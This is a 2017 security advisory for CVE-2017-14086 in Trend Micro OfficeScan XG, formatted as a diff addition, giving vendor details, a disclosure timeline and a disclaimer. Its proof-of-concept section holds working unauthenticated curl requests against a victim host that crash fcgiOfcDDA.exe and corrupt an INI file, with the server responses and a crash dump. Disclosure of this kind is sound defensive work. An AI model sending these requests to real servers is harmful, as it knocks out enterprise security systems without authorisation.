@@ -1,0 +1,135 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-14086-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-START-REMOTE-PROCESS-CODE-EXECUTION-MEM-CORRUPT.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==================
+www.trendmicro.com
+
+
+
+Product:
+========
+OfficeScan XG
+v11.0 and (12.0)*
+
+
+
+Vulnerability Type:
+===================
+Unauthorized Start Remote Process Code Execution
+Unauthorized Denial Of Service - INI Corruption
+
+OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
+An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
+manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
+web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
+
+
+
+CVE Reference:
+==============
+CVE-2017-14086
+
+
+
+Security Issue:
+================
+Remote unauthenticated attackers who connect to the OfficeScan XG application can temporarily start the "fcgiOfcDDA.exe" executable
+this process will run for short time before dies, server disk space may also be consumed with dump files by making continous HTTP requests.
+
+
+References:
+===========
+https://success.trendmicro.com/solution/1118372
+
+
+
+Exploit/POC Start Remote Process Code Execution:
+================================================
+c:\> curl -k  https://VICTIM-IP:4343/officescan/console/CGI/ 
+
+HTTP response:
+403 - Forbidden: Access is denied.
+You do not have permission to view this directory or page using the credentials that you supplied
+
+But, we can access it directly :)
+
+c:\> curl -v -k  https://VICTIM-IP:4343/officescan/console/CGI/fcgiOfcDDA.exe
+
+HTTP Response:
+
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.
+
+The EXE is called then runs for short time before .DMP is generated.
+
+fcgiOfcDDA.exe.6808.dmp
+
+The stored exception information can be accessed via .ecxr.
+(568.112c): Unknown exception - code c000000d (first/second chance not available)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for kernel32.dll - 
+eax=00000000 ebx=0014f780 ecx=00000000 edx=00000000 esi=00000002 edi=00000000
+eip=77d9016d esp=0014f730 ebp=0014f7cc iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!NtWaitForMultipleObjects+0x15:
+
+
+
+Exploit/POC (Denial Of Service / INI Corruption):
+==================================================
+[root@localhost /]# curl -v -k  https://VICTIM-IP:4343/officescan/CGI/cgiRqUpd.exe
+* About to connect() to VICTIM-IP port 4343
+*   Trying VICTIM-IP.. connected
+
+
+<HTTP/1.1 200 OK
+< Pragma: no-cache
+< Content-Type: text/plain;charset=iso-8859-1
+< Server: Microsoft-IIS/7.5
+< X-Powered-By: ASP.NET
+< Date: Fri, 02 Jun 2017 18:00:36 GMT
+< Connection: close
+< Content-Length: 22
+
+[INI_UPDATE_SECTION]
+
+
+BOOOM!
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: June 2, 2017
+Vendor releases fixes / advisory : September 27, 2017
+September 28, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
